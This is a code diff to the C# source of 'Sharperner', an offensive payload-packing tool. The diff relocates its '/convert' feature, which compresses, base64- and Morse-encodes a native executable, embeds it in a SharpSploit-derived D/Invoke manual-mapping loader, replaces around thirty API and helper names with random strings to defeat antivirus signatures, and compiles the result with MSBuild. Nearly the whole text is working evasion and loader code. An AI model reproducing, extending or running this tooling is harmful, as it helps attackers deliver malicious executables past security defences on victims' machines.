@@ -604,14 +604,15 @@ by @ch4rm with <3
         public static void help()
         {
             string help = @"
-/file       B64,hex,raw
+/file       B64,hex,raw 
 /type       cs,cpp
 /out        Output file Location (Optional)
-/convert    File input. Convert PE to .NET Assembly using D/Invoke (Optional)
+/convert    File input. Embed PE to .NET Assembly using Manual Mapping
 
 Example:
 Sharperner.exe /file:file.txt /type:cpp
 Sharperner.exe /file:file.txt /out:payload.exe
+Sharperner.exe /convert:pe.exe
 ";
             Console.WriteLine(help);
         }
@@ -651,162 +652,15 @@ Sharperner.exe /file:file.txt /out:payload.exe
                 Console.WriteLine("[!] No arguments supplied");
                 help();
             }
-            else if (arguments.ContainsKey("/convert"))
-            {
-                if (string.IsNullOrEmpty(arguments["/convert"]))
-                {
-                    Console.WriteLine("[!] Empty input file or type");
-                }
-                else
-                {
-                    filePath = arguments["/convert"];
-
-                    if (!File.Exists(filePath)) //if file exists
-                    {
-                        Console.WriteLine("[+] File Not Found");
-                        return;
-                    }
-                    else
-                    {
-                        if (ExeChecker.IsValidExe(filePath))
-                        {
-                            if (!filePath.EndsWith(".exe"))
-                            {
-                                Console.WriteLine("[!] Invalid extension");
-                                return;
-                            }
-                            else
-                            {
-                                var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
-                                var parentDir = directory.FullName;
-
-                                outputFile = $"DInvoke_{Path.GetFileName(filePath)}";
-
-                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
-                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
-                                var tempLoaderFileContent = loaderFileContent;
-                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
-
-                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit.");
-
-                                var PEFile = File.ReadAllBytes(filePath);
-                                var msBuildPath = GetMSBuildPath();
-                                
-                                if (string.IsNullOrEmpty(msBuildPath))
-                                {
-                                    Console.WriteLine("[!] MSBuild path not found");
-                                }
-                                else
-                                {
-                                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
-
-                                    MorseForFun.InitializeDictionary();
-
-                                    var compByteArray = Compress(PEFile);
-                                    var b64String = Convert.ToBase64String(compByteArray);
-                                    var morsedb64String = MorseForFun.Send(b64String);
-
-                                    try
-                                    {
-                                        //replace all occurences
-                                        string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
-                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
-                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
-                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
-
-                                        foreach (string signature in signatures)
-                                        {
-                                            string randomWord = GenerateRandomString();
-
-                                            // randomizing in SharpSploit's lib
-                                            foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
-                                            {
-                                                string libFileContent = File.ReadAllText(file);
-
-                                                loaderFileContent = loaderFileContent.Replace(signature, randomWord);
-
-                                                libFileContent = libFileContent.Replace(signature, randomWord);
-
-                                                File.WriteAllText(file, libFileContent);
-
-                                            }
-                                        }
-
-                                        loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
-
-                                    }
-                                    catch
-                                    {
-                                        Console.WriteLine("[!] Error replacing values");
-                                    }
-
-                                    try
-                                    {
-                                        File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
-
-                                        Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
-
-                                        Thread.Sleep(2000);
-
-                                        var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";
-
-                                        if (File.Exists(nativeExecutableBinaryLoaderPath))
-                                        {
-                                            File.Copy(nativeExecutableBinaryLoaderPath, currentDirOutputFile, true);
-
-                                            if(File.Exists(currentDirOutputFile))
-                                            {
-                                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
-                                            }
-                                            else
-                                            {
-                                                Console.WriteLine("[!] Failed to copy file");
-                                            }
-
-                                        }
-                                        else
-                                        {
-                                            Console.WriteLine($"[!] Fail to compile DInvoke project");
-                                        }
-
-                                    }
-                                    catch
-                                    {
-                                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
-                                    }
-
-                                    Console.WriteLine("[+] Doing some cleaning...");
-
-                                    //revert all library files
-                                    foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
-                                    {
-                                        File.Copy($"{file}.ori", file, true);
-                                    }
-
-                                    //revert nativeBinaryLoader
-                                    File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
-
-                                    File.Delete(nativeExecutableBinaryLoaderPath);
-
-                                    Thread.Sleep(1000);
-                                }
-                                
-                            }
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] Invalid PE file");
-                        }
-                    }
-
-                }
-
-            }
             else if (arguments.ContainsKey("/file"))
             {
                 if (!arguments.ContainsKey("/type"))
                 {
                     Console.WriteLine("[!] Missing /type argument");
+                }
+                else if (arguments.ContainsKey("/convert"))
+                {
+                    Console.WriteLine("[!] /convert can't be used with /file and /type");
                 }
                 else if (string.IsNullOrEmpty(arguments["/file"]) || string.IsNullOrEmpty(arguments["/type"]))
                 {
@@ -1201,6 +1055,161 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     }
                 
                 }             
+
+            }
+            else if (arguments.ContainsKey("/convert"))
+            {
+                if (arguments.ContainsKey("/file") || arguments.ContainsKey("/type"))
+                {
+                    Console.WriteLine("[!] Other arguments can't be used with /convert");
+                }
+                else if (string.IsNullOrEmpty(arguments["/convert"]))
+                {
+                    Console.WriteLine("[!] Empty input file");
+                }
+                else
+                {
+                    filePath = arguments["/convert"];
+
+                    if (!File.Exists(filePath)) //if file exists
+                    {
+                        Console.WriteLine("[+] File Not Found");
+                        return;
+                    }
+                    else
+                    {
+                        if (ExeChecker.IsValidExe(filePath))
+                        {
+                            if (!filePath.EndsWith(".exe"))
+                            {
+                                Console.WriteLine("[!] Invalid extension");
+                                return;
+                            }
+                            else
+                            {
+                                var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
+                                var parentDir = directory.FullName;
+
+                                outputFile = $"DInvoke_{Path.GetFileName(filePath)}";
+
+                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
+                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
+                                var tempLoaderFileContent = loaderFileContent;
+                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
+
+                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit.");
+
+                                var PEFile = File.ReadAllBytes(filePath);
+                                var msBuildPath = GetMSBuildPath();
+
+                                if (string.IsNullOrEmpty(msBuildPath))
+                                {
+                                    Console.WriteLine("[!] MSBuild path not found");
+                                }
+                                else
+                                {
+                                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+
+                                    MorseForFun.InitializeDictionary();
+
+                                    var compByteArray = Compress(PEFile);
+                                    var b64String = Convert.ToBase64String(compByteArray);
+                                    var morsedb64String = MorseForFun.Send(b64String);
+
+                                    try
+                                    {
+                                        //replace all occurences
+                                        string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
+                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
+                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
+                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
+
+                                        foreach (string signature in signatures)
+                                        {
+                                            string randomWord = GenerateRandomString();
+
+                                            // randomizing in SharpSploit's lib
+                                            foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                            {
+                                                string libFileContent = File.ReadAllText(file);
+
+                                                loaderFileContent = loaderFileContent.Replace(signature, randomWord);
+
+                                                libFileContent = libFileContent.Replace(signature, randomWord);
+
+                                                File.WriteAllText(file, libFileContent);
+
+                                            }
+                                        }
+
+                                        loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
+
+                                    }
+                                    catch
+                                    {
+                                        Console.WriteLine("[!] Error replacing values");
+                                    }
+
+                                    try
+                                    {
+                                        File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
+
+                                        Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
+
+                                        Thread.Sleep(2000);
+
+                                        var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";
+
+                                        if (File.Exists(nativeExecutableBinaryLoaderPath))
+                                        {
+                                            File.Copy(nativeExecutableBinaryLoaderPath, currentDirOutputFile, true);
+
+                                            if (File.Exists(currentDirOutputFile))
+                                            {
+                                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                            }
+                                            else
+                                            {
+                                                Console.WriteLine("[!] Failed to copy file");
+                                            }
+
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine($"[!] Fail to compile DInvoke project");
+                                        }
+
+                                    }
+                                    catch
+                                    {
+                                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                                    }
+
+                                    Console.WriteLine("[+] Doing some cleaning...");
+
+                                    //revert all library files
+                                    foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                    {
+                                        File.Copy($"{file}.ori", file, true);
+                                    }
+
+                                    //revert nativeBinaryLoader
+                                    File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
+
+                                    File.Delete(nativeExecutableBinaryLoaderPath);
+
+                                    Thread.Sleep(1000);
+                                }
+
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] Invalid PE file");
+                        }
+                    }
+
+                }
 
             }
             else
